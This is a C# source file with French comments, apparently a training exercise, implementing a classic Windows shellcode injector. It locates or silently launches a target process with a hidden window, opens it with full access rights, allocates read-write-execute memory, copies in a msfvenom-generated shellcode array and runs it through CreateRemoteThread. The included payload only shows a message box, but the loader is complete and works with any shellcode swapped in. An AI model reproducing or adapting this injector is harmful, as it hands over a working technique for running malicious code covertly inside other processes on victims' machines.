using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

//Le programme prend en argument un nom de processus cible.
//Il cherche ce processus ; s’il n’existe pas, il tente de le démarrer.
//Il récupère un handle sur le processus (accès très large).
//Il alloue de la mémoire dans l’espace mémoire du processus cible.
//Il copie un tableau d’octets (“payload”) dans cette zone mémoire distante.
//Il déclenche l’exécution de cette zone mémoire en créant un thread dans le processus cible.

namespace Injector
{
    public class BasicShellcodeInjector
    {

        //permet de definir les droits d'acces à un processus windows
        [Flags]
        public enum ProcessAccessFlags : uint
        {
            //acces complet au processus
            All = 0x001F0FFF
        }
        //Permet d'obtenir un handle vers un processus distant
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId);

        //type d'allocation memoire utilisable avec VirtualAllocEx
        [Flags]
        public enum AllocationType
        {
            //allocation de la memoire
            Commit = 0x1000,
            //Reservation de la mémoire
            Reserve = 0x2000
        }
        [Flags]
        //type de protection de la memoire
        public enum MemoryProtection
        {
            ExecuteReadWrite = 0x40
        }
        //permet d'allouer de la memoire dans un processus distant
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr procHandle, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

        //permet d'ecrire des données dans la memoire d'un processus distant
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr procHandle, IntPtr lpBaseAddress, byte[] lpscfer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        //Permet de créer un thread dans un processus distant
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr procHandle, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        //point d'entrée principal du programme
        //le programme souhaite recevoir un argument sous un tableau de string. Exemple .\Exercice2.exe notepad.exe
        public static void Main(string[] args) // We accept arguments here (as a string array)
        {

            // Represente les données binaires brutes stockées en méoire
            // Define our shellcode as a csharp byte array
            //msfvenom -p windows/x64/messagebox TEXT='Task failed successfully!' TITLE='Error!' -f csharp --> j'ai obtenu ce code via kali linux
            byte[] sc = new byte[318] {0xfc,0x48,0x81,0xe4,0xf0,0xff,
            0xff,0xff,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
            0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x51,0x56,0x48,0x8b,
            0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,
            0x31,0xc9,0x48,0x8b,0x72,0x50,0x48,0x31,0xc0,0xac,0x3c,0x61,
            0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,
            0xed,0x52,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,
            0x41,0x51,0x66,0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,
            0x00,0x00,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,
            0x67,0x48,0x01,0xd0,0x50,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,
            0x8b,0x48,0x18,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,
            0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0x41,0xc1,0xc9,
            0x0d,0xac,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
            0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,
            0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,
            0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x41,0x58,0x48,0x01,0xd0,
            0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,
            0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
            0x8b,0x12,0xe9,0x4b,0xff,0xff,0xff,0x5d,0xe8,0x0b,0x00,0x00,
            0x00,0x75,0x73,0x65,0x72,0x33,0x32,0x2e,0x64,0x6c,0x6c,0x00,
            0x59,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x49,0xc7,0xc1,
            0x00,0x00,0x00,0x00,0xe8,0x1a,0x00,0x00,0x00,0x54,0x61,0x73,
            0x6b,0x20,0x66,0x61,0x69,0x6c,0x65,0x64,0x20,0x73,0x75,0x63,
            0x63,0x65,0x73,0x73,0x66,0x75,0x6c,0x6c,0x79,0x21,0x00,0x5a,
            0xe8,0x07,0x00,0x00,0x00,0x45,0x72,0x72,0x6f,0x72,0x21,0x00,
            0x41,0x58,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,
            0xd5,0x48,0x31,0xc9,0x41,0xba,0xf0,0xb5,0xa2,0x56,0xff,0xd5};
            int len = sc.Length;

            // Argument parsing
            // Error if an incorrect number of arguments is passed
            //si on ne passe de string en parametre, le programme s'arrete !
            if (!(args.Length == 1))
            {
                Console.WriteLine("Incorrect number of arguments.\nUsage: BasicShellcodeInjectorDynamicTarget.exe <target process>");
                return;
            }

            // recupere le nom du processus cible, supprime l'extension exe si présente
            string targetProc = args[0].Replace(".exe", string.Empty);
            int pid = 0;

            //recherche des processus correspondants au process donné en argument
            Process[] expProc = Process.GetProcessesByName(targetProc);
            //gestion ou le processus est deja lancé.
            if(expProc.Length == 0){ 
                // Launch the target process and get its PID
                // As per the assignment, we assume it is in the windows PATH
                try {
                    var p = new Process();
                    p.StartInfo.FileName = $"{targetProc}.exe";
                    //LANCE LE PROCESSUS sans afficher de fenetre visible !!!!!
                    p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden; // Hide the spawned window
                    p.Start();
                    //recuperer le PID
                    pid = p.Id;
                } catch {
                    //gestion erreur si le processus ne peut pas être lancé 
                    Console.WriteLine("Could not launch specified process.");
                    return;
                }
            } else {
                // The process is already running - just get its PID
                pid = expProc[0].Id;
            }
            //affichage des informations du processus cible
            Console.WriteLine($"Target process: {targetProc} [{pid}].");

            //----------------Ouverture du processus -------------

            //on obtient un handle vers le processus cible
            IntPtr procHandle = OpenProcess(ProcessAccessFlags.All, false, pid);
            //on verifie si l'ouverture du processus a reussi !
            if ((int)procHandle == 0)
            {
                Console.WriteLine($"Failed to get handle on PID {pid}. Do you have the right privileges?");
                return;
            } else {
                Console.WriteLine($"Got handle {procHandle} on target process.");
            }

            //Allocation d'une zone mémoire dans le processus distant
            //la taille correspond aux données à copier
            //La memoire est reservée et autroisée en lecture/ecriture/execution
            IntPtr memAddr = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)len, AllocationType.Commit | AllocationType.Reserve, 
                MemoryProtection.ExecuteReadWrite);
            //indique que l'allocation de mémoire a reussi
            Console.WriteLine($"Allocated memory in remote process.");

            //varaible destinée à stockerle nombre d'octets réellement écrits
            IntPtr bytesWritten;
            //Ecriture des données binaires dans la mémoire du processus distant
            bool procMemResult = WriteProcessMemory(procHandle, memAddr, sc, len, out bytesWritten);
            //verifie si l'ecriture en mémoire a reussi
            if(procMemResult){
                Console.WriteLine($"Wrote {bytesWritten} bytes.");
             } else {
                Console.WriteLine("Failed to write to remote process.");
             }
            //Création d'un thread dans le processus distant
            //le point d'entree du thread correspond à l'adresse mémoire précédemment allouée
            IntPtr tAddr = CreateRemoteThread(procHandle, IntPtr.Zero, 0, memAddr, IntPtr.Zero, 0, IntPtr.Zero);
            Console.WriteLine($"Created remote thread!");

        }
    }
}